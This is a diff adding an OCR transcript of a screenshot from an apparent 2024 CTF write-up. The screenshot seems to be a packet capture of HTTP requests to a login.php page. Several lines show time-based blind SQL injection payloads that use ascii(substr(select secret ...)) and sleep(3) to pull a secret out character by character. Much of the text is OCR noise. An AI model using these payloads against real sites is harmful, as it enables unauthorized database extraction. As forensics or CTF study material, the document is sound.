@@ -1,0 +1,26 @@
+# OCR: 2acda039ef60ca8a178fbdabb2680a26.webp
+# 来源: .\02-WriteUp\2024\2acda039ef60ca8a178fbdabb2680a26.webp
+# 引擎: tesseract(chi_sim+eng)
+# 生成: 2026-09-01 22:12
+
+459 +492.106.22.4 ATP RECA heater eet Cen oe
+a 192. 168.22.139 HTTP. 362 GET /login.php/?name=lucy *%2@and%2@if ( (ascii (substr( (%20select%20secret%20From&20secret.. secret%201imit%200, 1) ,15,1)))%3E32, sleep(3) ,0)%23&su...
+i 192. 168.22.139 HTTP. 362 GET /login.php/?name=lucy *%2@and%20iF ( (ascii (substr( (%20select%20secret%2From&20secret.. secret%201imit%200, 1) ,16,1)))%3E79, sleep(3) ,0)%23&su..
+139 192.168.22.1 HTTP. 1229 HTTP/1.1 208 OK (text/html)
+4 192.168.22.139 HTTP. 362 GET /login.php/?name=lucy *%2@and%2@iF ( (ascii (substr( (%20select%20secret%20From%20secret.. secret%201imit%200, 1) ,16,1)))%3E55, sleep(3) ,0)%23&su...
+139 192.168.22.1 HTTP. 1229 HTTP/1.1 20@ OK (text/html)
+1 一 目 Secret%201imit%200,1),16,1)))%3E43, sleep(3) ,0)%23&su..
+139 着 This.1s Secret! e+
+1 secret%201imit%20,1) ,16,1)))%3E37, sleep(3) ,0)%238su...
+ty Xt 。 椿 。 一 一 ) 2 pG),0)
+1 E} ctoot @ _@ _@ 乃 % et%201imit%200, 1) ,16,1)))%3E34, sleep(3) ,0)%23&su...
+139
+1 Octool HF meRBSe Re BH SH at Eth 88 et%201imit%200,1) ,16,1)))%3E33, sleep(3) ,@)%23&su...
+139 一 一
+1 JSONTS SRS ERISA RTI, REE “ 明 间 日 贼 @ ASCIL SBS HewsString  ARM/HEX |et%201imit%200,1),16,1)))%3E32, sleep(3),0)%238su..
+139) HIRES OBE © UnIREHT
+1
+139 1
+ot 5
+E
+限 | = ES...
